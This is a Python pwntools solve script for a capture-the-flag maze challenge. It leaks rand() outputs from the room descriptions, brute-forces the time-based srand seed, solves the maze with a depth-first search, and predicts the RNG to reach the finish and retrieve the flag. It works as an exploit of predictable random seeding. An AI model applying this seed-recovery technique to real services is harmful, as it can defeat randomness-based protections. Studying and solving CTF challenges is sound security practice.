from pwn import *
from ctypes import CDLL
import time
import re

libc = CDLL("libc.so.6")

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337
conn = remote(HOST, int(PORT))

space = [None] * 4
adorned = [None] * 16
style = [None] * 16

space[0] = "cozy";
space[1] = "medium-sized";
space[2] = "spacious";
space[3] = "massive";
adorned[0] = "bookshelves";
adorned[1] = "fireplaces";
adorned[2] = "suits of armor";
adorned[3] = "tables";
adorned[4] = "chests";
adorned[5] = "beds";
adorned[6] = "paintings";
adorned[7] = "statues";
adorned[8] = "tapestries";
adorned[9] = "candelabras";
adorned[10] = "chairs";
adorned[11] = "fountains";
adorned[12] = "mirrors";
adorned[13] = "rugs";
adorned[14] = "curtains";
adorned[15] = "chess sets";
style[0] = "Art Deco";
style[1] = "Baroque";
style[2] = "Classical";
style[3] = "Colonial";
style[4] = "Contemporary";
style[5] = "Country";
style[6] = "Gothic";
style[7] = "Industrial";
style[8] = "Mediterranean";
style[9] = "Minimalist";
style[10] = "Neoclassical";
style[11] = "Renaissance";
style[12] = "Rococo";
style[13] = "Romantic";
style[14] = "Rustic";
style[15] = "Victorian";

def leak_desc():
    line = conn.recvuntil(b"style.\n").decode()
    space1, adorned1, adorned2, flowers, nstars, style1 = re.findall(r"As you step into the room, you find yourself standing in a (.+?) space. The walls are adorned with (.+?) and a two large (.+?) dominate the center of the room. You see (.+?) flowers in a vase, and through a window you stop to count (.+?) stars. The room appears well designed in the (.+?) style.", line)[0]
    return space.index(space1) + (adorned.index(adorned1) << 2) + (adorned.index(adorned2) << 6) + (style.index(style1) << 10) + (int(nstars) << 14)

def brute_offset(leak, seedrange, distrange):
    for seed in seedrange:
        libc.srand(seed)
        distiter = iter(distrange)
        first = next(distiter)
        for _ in range(first):
            libc.rand()
        for dist in distiter:
            randval = libc.rand()
            if leak == randval:
                print("seed:", seed, "dist: ", dist)
                return seed, dist

conn.recvuntil(b"Welcome to the maze!")
leak = leak_desc()
ts = int(time.time())
seed, dist = brute_offset(leak, range(ts - 3600, ts + 10), range(550, 650))

# WIN MAZE...
conn.recvuntil(b"end the torment: ")
conn.sendline(b"a")
print(conn.recvuntil(b"above the maze.\n"))

m = conn.recvuntil(b"You are")

m = m.decode().split("\n")[:-2]
print("\n".join(m))

# find start, end
X = len(m)
Y = len(m[0])
for i in range(X):
    for j in range(Y):
        if m[i][j] == "@":
            s = (i,j)
        if m[i][j] == "*":
            e = (i,j)

dx = [-1,1,0,0]
dy = [0,0,-1,1]
di = ["n","s","w","e"]

visited = set([])

def dfs(c):
    print("at", c, m[c[0]][c[1]])
    if m[c[0]][c[1]] == "*":
        return []
    visited.add(c)
    for i in range(4):
        x2, y2 = c[0]+dx[i], c[1]+dy[i]
        if 0 <= x2 < X and 0 <= y2 < Y and m[x2][y2] != "#" and (x2,y2) not in visited:
            res = dfs((x2,y2))
            if res != None:
                return [di[i]]+res
    return None

path = dfs(s)

print(path)

for i in path[:-1]:
    conn.sendline(i.encode())

conn.clean(1)
conn.sendline(b"x")
leak = leak_desc()
_, dist = brute_offset(leak, [seed], range(dist, dist + 1000))

while libc.rand() % 1213 != 1212:
    conn.sendline(b"x")

# STEP ONTO THE FINISH LINE
conn.sendline(path[-1].encode())

conn.recvuntil(b"Congratulations!")
conn.sendline(b'./submitter')
flag = conn.recvline_contains(b'LiveCTF{').decode().strip()
log.info('Flag: %s', flag)
